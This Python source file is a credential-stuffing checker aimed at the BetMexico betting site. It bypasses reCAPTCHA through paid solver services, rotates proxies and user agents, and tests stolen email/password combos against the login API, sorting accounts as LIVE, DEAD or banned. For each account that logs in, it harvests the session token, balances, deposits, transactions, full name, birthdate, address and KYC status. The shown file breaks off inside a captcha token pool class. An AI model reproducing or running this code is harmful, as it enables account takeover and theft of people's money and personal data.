#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BetMexico Login API-Only (Sin Playwright)
Solo captcha + POST API + fetch detalles
Drop-in replacement de betmexico_login.py

Uso:
    checker = BetmexicoApiChecker(proxy={"server": "host:port", "username": "...", "password": "..."})
    result = await checker.test_login(email, password)
    # result = {"status": "LIVE"/"DEAD"/"RETRY_CAPTCHA"/"ERROR", ...}
"""

import asyncio
import logging
import random
import time
from typing import Optional, Dict
from datetime import datetime, timezone
from zoneinfo import ZoneInfo

MX_TZ = ZoneInfo("America/Mexico_City")

def now_mx() -> datetime:
    """datetime.now() en horario central de México."""
    return datetime.now(MX_TZ)

import base64
import json
import httpx
import requests


def _decode_jwt_payload(jwt_token: str) -> dict:
    """Decodifica el payload de un JWT sin verificar firma. Solo stdlib."""
    try:
        payload_b64 = jwt_token.split('.')[1]
        padding = '=' * ((4 - len(payload_b64) % 4) % 4)
        decoded = base64.urlsafe_b64decode(payload_b64 + padding).decode('utf-8')
        return json.loads(decoded)
    except Exception:
        return {}


# ******************************************************************************#
#                               LOGGING                                         #
# ******************************************************************************#
# NOTA: logging.basicConfig se configura en betmexico_config.py (módulo central)
# No llamar basicConfig aquí para evitar conflictos de configuración.
logger = logging.getLogger(__name__)

logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# ******************************************************************************#
#                            CONFIGURACION                                      #
# ******************************************************************************#

BETMEXICO_URLS = {
    "login": "https://betmexico.mx/login",
    "api_login": "https://betmexico.mx/api/Session/login",
    "wallet": "https://paymentsapi.betmexico.mx/api/Wallet/Total/Amount/ByAccountType",
    "deposit": "https://paymentsapi.betmexico.mx/api/user/LastDepositDetail",
    "user": "https://betmexico.mx/api/Users/",
    "kyc": "https://betmexico.mx/api/UserDocument/GetStatusFiles",
    "kyc_validation": "https://betmexico.mx/api/Users/Validate/HasFullValidation",
    "transactions": "https://paymentsapi.betmexico.mx/api/Wallet/Transactions/ByUser/",
}

import os

CAPMONSTER_API_KEY = os.getenv("BMX_CAPMONSTER_KEY", "")
CAPSOLVER_API_KEY = os.getenv("BMX_CAPSOLVER_KEY", "")
ANTICAPTCHA_API_KEY = CAPMONSTER_API_KEY  # alias de compatibilidad
RECAPTCHA_V2_SITE_KEY = os.getenv("BMX_RECAPTCHA_SITEKEY", "6Lcz348mAAAAACAn9C2YDf2GT7Rd2UVqhGdWeVc4")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
]


# ******************************************************************************#
#                         ANTICAPTCHA SOLVER                                    #
# ******************************************************************************#
class AntiCaptchaSolverFast:
    def __init__(self, apikey: str, proxy: Optional[str] = None):
        self.apikey = apikey
        self.base_url = "https://api.capsolver.com"
        self.service_name = "CapSolver"
        self.proxy = None  # CapSolver no requiere proxy desde el VPS

    async def check_balance(self) -> Optional[float]:
        """Verifica balance de la API key. Retorna balance o None si falla."""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.post(
                    f"{self.base_url}/getBalance",
                    json={"clientKey": self.apikey},
                )
                result = resp.json()
                if result.get("errorId", 0) == 0:
                    return result.get("balance", 0.0)
                return None
        except Exception:
            return None

    async def get_recaptcha_v2_token(self, website_url: str, website_key: str) -> Optional[tuple]:
        """Retorna (token, task_id) o None. task_id se necesita para reportar."""
        task_id = await self._create_task(website_url, website_key)
        if not task_id:
            return None

        logger.info("[CAPTCHA] Polling cada 4s...")
        max_attempts = 60

        for attempt in range(max_attempts):
            await asyncio.sleep(4)

            result = await self._get_task_result(task_id)

            if result and result.get("status") == "ready":
                token = result.get("solution", {}).get("gRecaptchaResponse")
                if token:
                    logger.info(f"[CAPTCHA] Token obtenido en {(attempt + 1) * 4}s")
                    return (token, task_id)
            elif result and result.get("errorId", 0) != 0:
                logger.error(f"[CAPTCHA] Error: {result.get('errorDescription')}")
                return None

        logger.error("[CAPTCHA] Timeout después de 240s")
        return None

    async def report_incorrect(self, task_id: str):
        """Reporta un captcha como incorrectamente resuelto para recuperar balance."""
        payload = {
            "clientKey": self.apikey,
            "taskId": task_id,
        }
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.post(
                    f"{self.base_url}/reportIncorrectRecaptcha", json=payload
                )
                result = resp.json()
                if result.get("errorId", 0) == 0:
                    logger.info(f"[CAPTCHA] ✅ Reporte aceptado (task {task_id}) → balance repuesto")
                else:
                    logger.warning(f"[CAPTCHA] Reporte rechazado: {result.get('errorDescription')}")
        except Exception as e:
            logger.debug(f"[CAPTCHA] Error reportando: {e}")

    async def _create_task(self, website_url: str, website_key: str) -> Optional[str]:
        payload = {
            "clientKey": self.apikey,
            "task": {
                "type": "ReCaptchaV2TaskProxyLess",
                "websiteURL": website_url,
                "websiteKey": website_key,
            },
            "softId": 0,
        }

        # Async nativo: captchas no usan proxy → httpx es seguro y elimina overhead del executor
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                resp = await client.post(f"{self.base_url}/createTask", json=payload)
                result = resp.json()

            if result.get("errorId", 0) == 0:
                task_id = result.get("taskId")
                logger.info(f"[CAPTCHA] Task creado: {task_id}")
                return str(task_id)
            else:
                logger.error(f"[CAPTCHA] Error creando task: {result.get('errorDescription')}")
                return None
        except Exception as e:
            logger.error(f"[CAPTCHA] Excepción creando task [{type(e).__name__}]: {e!r}")
            return None

    async def _get_task_result(self, task_id: str) -> Optional[Dict]:
        payload = {
            "clientKey": self.apikey,
            "taskId": task_id,  # CapSolver uses UUID strings
        }
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                resp = await client.post(f"{self.base_url}/getTaskResult", json=payload)
                return resp.json()
        except Exception as e:
            logger.debug(f"[CAPTCHA] Error polling: {e}")
            return None


class TwoCaptchaSolverFast:
    """Solver compatible con 2Captcha. Misma interfaz que AntiCaptchaSolverFast."""

    def __init__(self, apikey: str):
        self.apikey = apikey
        self.base_url = "https://api.2captcha.com"
        self.service_name = "2Captcha"

    async def check_balance(self) -> Optional[float]:
        """Verifica balance de la API key."""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.get(
                    f"{self.base_url}/res.php",
                    params={"key": self.apikey, "action": "getbalance", "json": 1},
                )
                result = resp.json()
                if result.get("status") == 1:
                    return float(result.get("request", 0))
                return None
        except Exception:
            return None

    async def get_recaptcha_v2_token(self, website_url: str, website_key: str) -> Optional[tuple]:
        """Retorna (token, task_id) o None."""
        task_id = await self._create_task(website_url, website_key)
        if not task_id:
            return None

        logger.info("[2CAPTCHA] Polling cada 5s...")
        for attempt in range(48):  # 240s max
            await asyncio.sleep(5)
            result = await self._get_task_result(task_id)
            if result and result.get("status") == 1:
                token = result.get("request", "")
                if token:
                    logger.info(f"[2CAPTCHA] Token obtenido en {(attempt + 1) * 5}s")
                    return (token, task_id)
            elif result and result.get("request") == "ERROR_CAPTCHA_UNSOLVABLE":
                logger.error("[2CAPTCHA] Captcha no resuelto")
                return None
        logger.error("[2CAPTCHA] Timeout")
        return None

    async def report_incorrect(self, task_id: str):
        """Reporta captcha incorrecto."""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.get(
                    f"{self.base_url}/res.php",
                    params={"key": self.apikey, "action": "reportbad", "id": task_id, "json": 1},
                )
                logger.info(f"[2CAPTCHA] Reporte enviado (task {task_id})")
        except Exception as e:
            logger.debug(f"[2CAPTCHA] Error reportando: {e}")

    async def _create_task(self, website_url: str, website_key: str) -> Optional[str]:
        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                resp = await client.post(
                    f"{self.base_url}/in.php",
                    data={
                        "key": self.apikey,
                        "method": "userrecaptcha",
                        "googlekey": website_key,
                        "pageurl": website_url,
                        "json": 1,
                    },
                )
                result = resp.json()
                if result.get("status") == 1:
                    task_id = str(result.get("request"))
                    logger.info(f"[2CAPTCHA] Task creado: {task_id}")
                    return task_id
                logger.error(f"[2CAPTCHA] Error: {result.get('request')}")
                return None
        except Exception as e:
            logger.error(f"[2CAPTCHA] Excepción creando task: {e}")
            return None

    async def _get_task_result(self, task_id: str) -> Optional[Dict]:
        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                resp = await client.get(
                    f"{self.base_url}/res.php",
                    params={"key": self.apikey, "action": "get", "id": task_id, "json": 1},
                )
                return resp.json()
        except Exception:
            return None


def create_solver(service: str, api_key: str):
    """Factory para crear solver según servicio."""
    if service == "2captcha":
        return TwoCaptchaSolverFast(api_key)
    elif service == "capmonster":
        return CapMonsterSolverFast(api_key)
    return AntiCaptchaSolverFast(api_key)


# ******************************************************************************#
#                              CHECKER                                          #
# ******************************************************************************#

class CapMonsterSolverFast:
    """Solver compatible con CapMonster Cloud."""
    def __init__(self, apikey: str):
        self.apikey = apikey
        self.base_url = "https://api.capmonster.cloud"
        self.service_name = "CapMonster"

    async def check_balance(self) -> Optional[float]:
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.post(f"{self.base_url}/getBalance", json={"clientKey": self.apikey})
                result = resp.json()
                if result.get("errorId", 0) == 0:
                    return result.get("balance", 0.0)
                return None
        except Exception:
            return None

    async def get_recaptcha_v2_token(self, website_url: str, website_key: str) -> Optional[tuple]:
        task_id = await self._create_task(website_url, website_key)
        if not task_id: return None
        logger.info("[CAPMONSTER] Polling cada 4s...")
        for attempt in range(60):
            await asyncio.sleep(4)
            result = await self._get_task_result(task_id)
            if result and result.get("status") == "ready":
                token = result.get("solution", {}).get("gRecaptchaResponse")
                if token:
                    logger.info(f"[CAPMONSTER] Token obtenido en {(attempt + 1) * 4}s")
                    return (token, task_id)
            elif result and result.get("errorId", 0) != 0:
                logger.error(f"[CAPMONSTER] Error: {result.get('errorDescription')}")
                return None
        logger.error("[CAPMONSTER] Timeout")
        return None

    async def report_incorrect(self, task_id: str):
        pass # CapMonster no soporta reportIncorrectRecaptcha

    async def _create_task(self, website_url: str, website_key: str) -> Optional[str]:
        payload = {
            "clientKey": self.apikey,
            "task": {
                "type": "NoCaptchaTaskProxyless",
                "websiteURL": website_url,
                "websiteKey": website_key,
            }
        }
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                resp = await client.post(f"{self.base_url}/createTask", json=payload)
                result = resp.json()
            if result.get("errorId", 0) == 0:
                return str(result.get("taskId"))
            else:
                logger.error(f"[CAPMONSTER] Error creando task: {result.get('errorDescription')}")
                return None
        except Exception as e:
            logger.error(f"[CAPMONSTER] Excepción creando task: {e!r}")
            return None

    async def _get_task_result(self, task_id: str) -> Optional[Dict]:
        payload = {"clientKey": self.apikey, "taskId": int(task_id)}
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                resp = await client.post(f"{self.base_url}/getTaskResult", json=payload)
                return resp.json()
        except Exception as e:
            return None


class BetmexicoApiChecker:
    """
    Checker sin Playwright. Solo:
    1. Resuelve captcha (AntiCaptcha)
    2. POST a /api/Session/login
    3. Si SUCCESS: fetch detalles en paralelo (balance, deposit, user, kyc)

    Misma interfaz que BetmexicoLoginTester para drop-in replacement.
    """

    def __init__(self, headless: bool = True, proxy: Optional[dict] = None, client: Optional[httpx.AsyncClient] = None):
        self.headless = headless  # Compatibilidad con BetmexicoLoginTester
        self.proxy = proxy  # {"server": "host:port", "username": "...", "password": "..."}
        self.user_agent = random.choice(USER_AGENTS)
        self.captcha_solver = CapMonsterSolverFast(CAPMONSTER_API_KEY)
        self._client = client
        self._external_client = client is not None

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.cleanup()
        return False

    def _get_client(self) -> httpx.AsyncClient:
        """Retorna un cliente httpx compartido para esta instancia."""
        if self._client is None or self._client.is_closed:
            proxy_url = self._get_httpx_proxy()
            self._client = httpx.AsyncClient(
                timeout=20.0,
                proxy=proxy_url,
                verify=False, # Evitar problemas de certificados en el VPS
                limits=httpx.Limits(max_connections=50, max_keepalive_connections=20)
            )
        return self._client

    def _get_httpx_proxy(self) -> Optional[str]:
        """Convierte proxy dict a URL para httpx. Maneja strings y dicts."""
        if not self.proxy:
            return None
        # Si es string (URL), retornar directamente
        if isinstance(self.proxy, str):
            return self.proxy
        # Si es dict, armar URL con componentes
        server = self.proxy.get("server") or self.proxy.get("server", "")
        if not server:
            return None
        username = self.proxy.get("username", "")
        password = self.proxy.get("password", "")
        if username:
            return f"http://{username}:{password}@{server}"
        return f"http://{server}"

    def _get_headers(self, extra: Optional[Dict] = None) -> Dict:
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://betmexico.mx",
            "Referer": BETMEXICO_URLS["login"],
        }
        if extra:
            headers.update(extra)
        return headers

    async def setup_browser(self):
        """Compatibilidad con interfaz anterior. Solo verifica proxy."""
        if self.proxy:
            try:
                client = self._get_client()
                resp = await client.get("https://api.ipify.org")
                logger.info(f"[PROXY] IP: {resp.text} | {self.proxy['server']}")
            except Exception as e:
                logger.warning(f"[PROXY] No se pudo verificar IP: {e}")
        else:
            logger.info("[NO PROXY] Corriendo sin proxy")

    async def test_login(self, email: str, password: str, captcha_token: Optional[str] = None, captcha_task_id: Optional[str] = None, fetch_mode: str = "full") -> Dict:
        """
        Test login para un combo.
        Si captcha_token viene pre-resuelto (del pool), lo usa directo.
        Si no, resuelve inline como fallback.
        captcha_task_id: para reportar a AntiCaptcha si el token es rechazado.
        """
        logger.info("")
        logger.info("=" * 60)
        logger.info(f"[TARGET] {email}")
        logger.info("=" * 60)

        try:
            # 1. Usar token pre-resuelto o resolver inline
            task_id_for_report = captcha_task_id
            if captcha_token:
                token = captcha_token
                logger.info("[CAPTCHA] Usando token pre-resuelto del pool")
            else:
                result_tuple = await self.captcha_solver.get_recaptcha_v2_token(
                    BETMEXICO_URLS["login"],
                    RECAPTCHA_V2_SITE_KEY,
                )
                if result_tuple:
                    token, task_id_for_report = result_tuple
                else:
                    token = None

            if not token:
                return {"status": "ERROR", "email": email, "password": password, "error": "CAPTCHA_TOKEN_FAIL"}

            # 2. POST login
            api_result = await self._login_api(email, password, token)
            status_code = api_result["status"]
            data = api_result["data"]

            result: Dict = {
                "status": "DEAD",
                "email": email,
                "password": password,
                "api": data,
            }

            if status_code == 200:
                if data.get("isSuccess"):
                    logger.warning(f"[SUCCESS] LOGIN OK: {email}")
                    jwt = data.get("token")
                    if jwt:
                        jwt_payload = _decode_jwt_payload(jwt)
                        exp = jwt_payload.get("exp")
                        user_id = None
                        for claim in ("nameid", "sub", "userId", "UserId", "unique_name"):
                            val = jwt_payload.get(claim)
                            if val and str(val).isdigit():
                                user_id = str(val)
                                break
                        result["jwt_token"] = jwt
                        result["jwt_expires_at"] = exp
                        result["jwt_user_id"] = user_id

                        account_details = await self.fetch_account_details_parallel(jwt, fetch_mode=fetch_mode)
                        account_details["jwt_token"] = jwt
                        account_details["jwt_expires_at"] = exp
                        account_details["jwt_user_id"] = user_id
                        result["account_details"] = account_details
                        # User Rule: KYC_PENDING is DEAD
                        # Check if verified is False and there is a pending documentation flag (if detected)
                        # For now, we trust LIVE if login was successful unless explicitly told otherwise.
                        result["status"] = "LIVE"
                    else:
                        logger.warning("[SUCCESS] Sin JWT en respuesta")
                        result["status"] = "ERROR"
                else:
                    # 200 OK but isSuccess = False (Account blocked, KYC pending, etc.)
                    err_msg = data.get("message", "").upper()
                    logger.error(f"[FAIL-API] {err_msg}: {email}")
                    if "KYC" in err_msg or "PENDING" in err_msg or "VALIDATION" in err_msg or "AUTOEXCLUSION" in err_msg:
                        result["status"] = "DEAD"
                    else:
                        result["status"] = "ERROR"

            elif status_code == 406 and data.get("error") == "FAILURE_IN_CAPTCHA":
                logger.error(f"[FAIL] 406 FAILURE_IN_CAPTCHA → RETRY")
                result["status"] = "RETRY_CAPTCHA"
                if task_id_for_report:
                    logger.info(f"[CAPTCHA] 📝 Reportando token malo (task {task_id_for_report})")
                    asyncio.create_task(self.captcha_solver.report_incorrect(task_id_for_report))
                else:
                    logger.info(f"[CAPTCHA] ⏭️ NO reportado (probable rate-limit, no token malo)")

            elif status_code == 401:
                # 401 is usually incorrect credentials or blocked.
                err_msg = data.get("message", "").upper()
                logger.info(f"[FAIL] 401 Unauthorized ({err_msg}): {email}")
                # We mark as DEAD only if it's clearly a credentials issue or explicit lock
                result["status"] = "DEAD"

            elif status_code == 403 or status_code == 429:
                logger.warning(f"[BAN] {status_code} Rate limit: {email}")
                result["status"] = "BAN"

            elif status_code >= 500:
                logger.error(f"[ERROR-SERVER] {status_code} BetMexico inestable: {email}")
                result["status"] = "ERROR"

            else:
                logger.error(f"[FAIL-UNK] {status_code} - {str(data)[:200]}")
                result["status"] = "ERROR"

            return result

        except Exception as e:
            logger.error(f"[ERROR] test_login: {e}")
            import traceback
            traceback.print_exc()
            return {"status": "ERROR", "email": email, "password": password, "error": str(e)}

    async def _login_api(self, email: str, password: str, captcha_token: str) -> Dict:
        """POST a /api/Session/login"""
        logger.info("[API] POST /api/Session/login/...")

        payload = {
            "username": email,
            "password": password,
            "extendedSession": True,
            "tokenCaptcha": {
                "token": captcha_token,
                "captchaVersion": "v2",
            },
        }

        client = self._get_client()
        resp = await client.post(
            BETMEXICO_URLS["api_login"],
            json=payload,
            headers=self._get_headers(),
        )

        logger.info(f"[API] Status: {resp.status_code}")
        try:
            data = resp.json()
        except Exception:
            data = {"raw": resp.text[:500]}

        return {"status": resp.status_code, "data": data}

    async def fetch_account_details_parallel(self, jwt_token: str, fetch_mode: str = "full") -> Dict:
        """Requests en paralelo. fetch_mode='full' (todo) | 'balance_only' (solo balance + tx page1)."""
        auth_headers = {
            "Authorization": f"Bearer {jwt_token}",
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
        }

        # Extraer userId y nombre del JWT para construir URL y fallback
        jwt_payload = _decode_jwt_payload(jwt_token)
        user_id_jwt = None
        for claim in (
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/sid",
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier",
            "sid", "nameid", "sub", "userId", "UserId", "unique_name",
        ):
            val = jwt_payload.get(claim)
            if val and str(val).isdigit():
                user_id_jwt = str(val)
                break
        
        user_profile_url = (
            f"{BETMEXICO_URLS['user']}{user_id_jwt}"
            if user_id_jwt
            else BETMEXICO_URLS["user"]
        )

        details = {
            "balance_real": 0.0,
            "balance_bonos": 0.0,
            "last_deposit_amount": 0.0,
            "last_deposit_date": "N/A",
            "fullname": "N/A",
            "birthdate": "N/A",
            "address": "N/A",
            "verified": False,
            "transactions": {"total_rows": 0, "pages": 0, "items": [], "fetched": False},
            "_auth_ok": False,
            "jwt_expired": False,
        }

        # Intentar obtener nombre del JWT como primera opción de fallback
        jwt_name = (
            jwt_payload.get("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name")
            or jwt_payload.get("unique_name")
            or jwt_payload.get("name")
        )
        if jwt_name and "@" not in jwt_name:
            details["fullname"] = jwt_name

        client = self._get_client()

        async def fetch_balance():
            try:
                resp = await client.get(BETMEXICO_URLS["wallet"], headers=auth_headers)
                if resp.status_code == 200:
                    balance_data = resp.json()
                    if isinstance(balance_data, dict) and balance_data.get("redirectLogin"):
                        logger.warning("[BALANCE] 401 redirectLogin detectado — JWT caducado")
                        details["_jwt_expired"] = True
                        details["jwt_expired"] = True
                        return
                    # La API retorna un array de objetos con accountType y totalAmount
                    details["_auth_ok"] = True
                    if isinstance(balance_data, list):
                        for item in balance_data:
                            acc_type = item.get("accountType", "")
                            amount = item.get("totalAmount", 0.0)
                            if acc_type == "Real":
                                details["balance_real"] = float(amount)
                            elif acc_type == "Bonos":
                                details["balance_bonos"] = float(amount)
                    elif isinstance(balance_data, dict):
                        details["balance_real"] = float(balance_data.get("Real", 0.0))
                        details["balance_bonos"] = float(balance_data.get("Bonos", 0.0))
                elif resp.status_code == 401:
                    logger.warning("[BALANCE] 401 Unauthorized — JWT caducado en servidor")
                    details["_jwt_expired"] = True
                    details["jwt_expired"] = True
                else:
                    logger.warning(f"[BALANCE] HTTP {resp.status_code}: {resp.text[:120]}")
            except Exception as e:
                logger.debug(f"[BALANCE] Error: {e}")

        async def fetch_deposit():
            try:
                resp = await client.get(BETMEXICO_URLS["deposit"], headers=auth_headers)
                if resp.status_code == 200:
                    deposit_data = resp.json()
                    if isinstance(deposit_data, dict) and deposit_data.get("redirectLogin"):
                        details["_jwt_expired"] = True
                        return
                    details["last_deposit_amount"] = float(deposit_data.get("amount", 0.0))
                    raw_date = deposit_data.get("date", "")
                    if raw_date:
                        try:
                            dt = datetime.fromisoformat(raw_date.replace("Z", "+00:00"))
                            dt_mx = dt.astimezone(MX_TZ)
                            details["last_deposit_date"] = dt_mx.strftime("%d/%m/%Y %H:%M")
                        except Exception:
                            details["last_deposit_date"] = raw_date[:10]
                elif resp.status_code == 401:
                    details["_jwt_expired"] = True
            except Exception as e:
                logger.debug(f"[DEPOSIT] Error: {e}")

        async def fetch_user_data():
            """Datos del usuario: nombre, birthdate, dirección."""
            try:
                resp = await client.get(user_profile_url, headers=auth_headers)
                if resp.status_code == 200:
                    user_data = resp.json()
                    if isinstance(user_data, dict) and user_data.get("redirectLogin"):
                        details["_jwt_expired"] = True
                        return
                    data_obj = user_data.get("data", {})
                    fname = data_obj.get("firstName") or ""
                    mname = data_obj.get("middleName") or ""
                    lname = data_obj.get("lastName") or ""
                    slname = data_obj.get("secondLastName") or ""
                    fullname = " ".join(filter(None, [fname, mname, lname, slname])).strip()
                    
                    if fullname:
                        details["fullname"] = fullname
                    elif data_obj.get("fullname") or data_obj.get("fullName"):
                        details["fullname"] = data_obj.get("fullname") or data_obj.get("fullName")
                    
                    if data_obj.get("birthDate") or data_obj.get("birthdate"):
                        details["birthdate"] = (data_obj.get("birthDate") or data_obj.get("birthdate")).split("T")[0]
                    
                    addr_obj = data_obj.get("address") or {}
                    street = addr_obj.get("streetAddress") or ""
                    city = addr_obj.get("city") or ""
                    state = addr_obj.get("state") or ""
                    country = addr_obj.get("country") or ""
                    address = ", ".join(filter(None, [street, city, state, country])).strip()
                    
                    if address:
                        details["address"] = address
                    elif data_obj.get("address"):
                        details["address"] = data_obj.get("address")
                elif resp.status_code == 401:
                    details["_jwt_expired"] = True
            except Exception as e:
                logger.error(f"[USER] Error fetching details: {e}")

        async def fetch_kyc_docs():
            """KYC via documentos (GetStatusFiles)."""
            try:
                resp = await client.get(BETMEXICO_URLS["kyc"], headers=auth_headers)
                if resp.status_code == 200:
                    docs = resp.json()
                    if isinstance(docs, dict) and docs.get("redirectLogin"):
                        details["_jwt_expired"] = True
                        return
                    if isinstance(docs, list) and len(docs) > 0:
                        all_approved = all(doc.get("isApproved", False) for doc in docs)
                        details["verified"] = all_approved
                        if all_approved:
                            logger.info(f"[KYC] ✅ Verificado - {len(docs)} docs aprobados")
                        else:
                            logger.warning("[KYC] ❌ NO verificado")
                    else:
                        details["verified"] = False
                        logger.warning("[KYC] ❌ Sin documentos")
                elif resp.status_code == 401:
                    details["_jwt_expired"] = True
                else:
                    details["verified"] = False
            except Exception as e:
                logger.error(f"[KYC] Error: {e}")

        async def fetch_kyc_validation():
            """KYC via HasFullValidation — más confiable que docs."""
            try:
                resp = await client.get(BETMEXICO_URLS["kyc_validation"], headers=auth_headers)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict) and data.get("redirectLogin"):
                        details["_jwt_expired"] = True
                        return
                    if data.get("isSuccess") and data.get("data") is True:
                        details["verified"] = True
                        logger.info("[KYC-V2] ✅ HasFullValidation = true")
                    else:
                        logger.info("[KYC-V2] ❌ HasFullValidation = false")
                elif resp.status_code == 401:
                    details["_jwt_expired"] = True
            except Exception as e:
                logger.debug(f"[KYC-V2] Error: {e}")

        async def fetch_transactions(max_pages: int = 2):
            """Historial de transacciones — hasta max_pages (10 items/page)."""
            txn_data = {"total_rows": 0, "pages": 0, "items": [], "fetched": False}
            try:
                # Página 1
                resp = await client.get(
                    BETMEXICO_URLS["transactions"],
                    params={"pageNumber": 1, "pageSize": 10},
                    headers=auth_headers,
                )
                if resp.status_code == 200:
                    body = resp.json()
                    if isinstance(body, dict) and body.get("redirectLogin"):
                        details["_jwt_expired"] = True
                        details["jwt_expired"] = True
                        return
                    data_obj = body.get("data", {}) if isinstance(body, dict) else {}
                    metadata = data_obj.get("metadata", {})
                    txn_data["total_rows"] = metadata.get("totalRows", 0)
                    txn_data["pages"] = metadata.get("pages", 0)

                    for item in data_obj.get("results", []):
                        txn_data["items"].append({
                            "date": item.get("date", ""),
                            "amount": float(item.get("amount", 0)),
                            "status": item.get("status", 0),
                            "type": item.get("type", 0),
                            "gateway": item.get("gateway", 0),
                        })

                    # Página 2 si existe y max_pages >= 2
                    if max_pages >= 2 and metadata.get("hasNextPage"):
                        resp2 = await client.get(
                            BETMEXICO_URLS["transactions"],
                            params={"pageNumber": 2, "pageSize": 10},
                            headers=auth_headers,
                        )
                        if resp2.status_code == 200:
                            body2 = resp2.json()
                            for item in body2.get("data", {}).get("results", []):
                                txn_data["items"].append({
                                    "date": item.get("date", ""),
                                    "amount": float(item.get("amount", 0)),
                                    "status": item.get("status", 0),
                                    "type": item.get("type", 0),
                                    "gateway": item.get("gateway", 0),
                                })

                    txn_data["fetched"] = True
                    logger.info(f"[TXN] {len(txn_data['items'])} transacciones obtenidas (total: {txn_data['total_rows']})")
                    details["transactions"] = txn_data
                elif resp.status_code == 401:
                    logger.warning("[TXN] 401 Unauthorized — JWT caducado")
                    details["_jwt_expired"] = True
                    details["jwt_expired"] = True
            except Exception as e:
                logger.debug(f"[TXN] Error: {e}")

        # Ejecutar en paralelo con timeout global de 15s; respetar fetch_mode.
        try:
            if fetch_mode == "balance_only":
                tasks = [fetch_balance(), fetch_transactions(max_pages=1)]
            else:
                tasks = [
                    fetch_balance(),
                    fetch_deposit(),
                    fetch_user_data(),
                    fetch_kyc_docs(),
                    fetch_kyc_validation(),
                    fetch_transactions(max_pages=2),
                ]
            try:
                await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=15.0)
            except asyncio.TimeoutError:
                logger.warning(f"[DETAILS] Timeout 15s en fetch_account_details_parallel (mode={fetch_mode}) — devolviendo lo logrado")
            except (asyncio.CancelledError, GeneratorExit):
                pass
        except (asyncio.CancelledError, GeneratorExit):
            pass
        except Exception as e:
            logger.error(f"[DETAILS] Error en gather parallel: {e}")

        if details.get("_jwt_expired") or not details.get("_auth_ok"):
            details["jwt_expired"] = True
            details["transactions"]["fetched"] = False
            logger.warning("[DETAILS] ❌ JWT CADUCADO O SIN AUTORIZACIÓN (401) — details marcados como jwt_expired")

        logger.info(
            f"[DETAILS] {details['fullname']} | "
            f"Balance: {details['balance_real']:.2f} | "
            f"Verified: {details['verified']} | "
            f"Txns: {details.get('transactions', {}).get('total_rows', 0)}"
        )

        return details

    async def cleanup(self):
        """Libera el cliente HTTP si lo creamos nosotros."""
        if self._client and not self._external_client:
            try:
                await self._client.aclose()
            except Exception:
                pass
            self._client = None


# ******************************************************************************#
#                         CAPTCHA TOKEN POOL                                    #
# ******************************************************************************#
class CaptchaTokenPool:
    """
    Pool de tokens reCAPTCHA pre-resueltos con 2 fases:
      - Fase 1 (prefetch): One-shot, pide N tokens en paralelo. No regenera.
      - Fase 2 (factory):  Loop continuo que mantiene el pool lleno.

    Los tokens de reCAPTCHA v2 expiran ~120s. Se descartan si tienen >90s.

    Uso:
        pool = CaptchaTokenPool(solver, url, key)
        await pool.prefetch(10)        # Fase 1: pre-calentar
        await pool.start_factory()     # Fase 2: loop continuo
        token = await pool.get_token() # Obtener token fresco
        await pool.stop()              # Apagar
    """

    TOKEN_MAX_AGE = 55  # segundos antes de considerar expirado

    def __init__(
        self,
        solver: AntiCaptchaSolverFast,
        website_url: str,
        website_key: str,
        max_pool: int = 12,
        factory_workers: int = 10,
    ):
        self.solver = solver
        self.website_url = website_url
        self.website_key = website_key
        self.max_pool = max_pool
        self.factory_workers = factory_workers
        self.pool: asyncio.Queue = asyncio.Queue()
        self.stopped = False
        self._factory_task: Optional[asyncio.Task] = None
        self._pending_solves = 0  # Cuántos captchas están resolviéndose ahora
        self._active_tasks: set = set()  # Tasks fire-and-forget activos
        self._stats = {
            "requested": 0,
            "resolved": 0,
            "expired": 0,
            "failed": 0,
            "wasted": 0,  # tokens que expiraron sin usarse
        }
        self._consecutive_failures = 0  # Circuit breaker: fallos seguidos sin éxito
        self._circuit_open = False       # True cuando el circuit está disparado

    # ── Fase 1: Prefetch one-shot ──────────────────────────────────────

    async def prefetch(self, count: int = 1, timeout: float = 120.0):
        """No-op. Modo 100% JIT bajo demanda (cero desperdicio especulativo)."""
        pass

    # ── Fase 2: Factory continua (MODO ON-DEMAND JIT) ───────────────────

    async def start_factory(self):
        """Modo 100% bajo demanda. Evita loops que resuelven tokens para quemar saldo."""
        self.stopped = False
        logger.info("[POOL] Modo 100% JIT bajo demanda activo (cero generación especulativa)")

    # ── Drenar tokens viejos ───────────────────────────────────────────

    async def drain_stale_tokens(self, max_age: float = 55.0):
        """Drena tokens viejos del pool."""
        fresh = []
        drained = 0
        while not self.pool.empty():
            try:
                item = self.pool.get_nowait()
                _, _, ts = item
                if (time.time() - ts) < max_age:
                    fresh.append(item)
                else:
                    drained += 1
